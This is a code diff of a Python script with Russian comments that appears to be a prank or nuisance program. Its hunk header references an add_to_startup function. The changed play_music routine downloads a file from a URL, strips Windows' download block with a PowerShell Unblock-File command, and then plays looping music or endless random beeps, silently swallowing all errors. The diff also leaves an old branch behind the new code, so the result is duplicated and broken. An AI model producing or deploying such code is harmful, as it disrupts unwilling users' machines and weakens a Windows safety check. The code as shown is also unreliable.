@@ -41,12 +41,29 @@ def add_to_startup():
 # === СКАЧИВАЕМ И ИГРАЕМ МУЗЫКУ ===
 def play_music():
     try:
-        # Скачиваем, если файла нет
         if not os.path.exists(MUSIC_FILE):
+            urllib.request.urlretrieve(MUSIC_URL, MUSIC_FILE)
+            # Снимаем блокировку Windows
+            os.system('powershell -Command "Unblock-File -Path \'' + MUSIC_FILE + '\'"')
+        
+        if os.path.exists(MUSIC_FILE):
             try:
-                urllib.request.urlretrieve(MUSIC_URL, MUSIC_FILE)
+                import pygame.mixer as mixer
+                mixer.init()
+                mixer.music.load(MUSIC_FILE)
+                mixer.music.play(-1)
+                return
             except:
                 pass
+
+        import winsound
+        while True:
+            freq = random.randint(200, 800)
+            duration = random.randint(50, 200)
+            winsound.Beep(freq, duration)
+            time.sleep(random.uniform(0.1, 0.5))
+    except:
+        pass
 
         # Если файл есть – играем через pygame
         if os.path.exists(MUSIC_FILE):
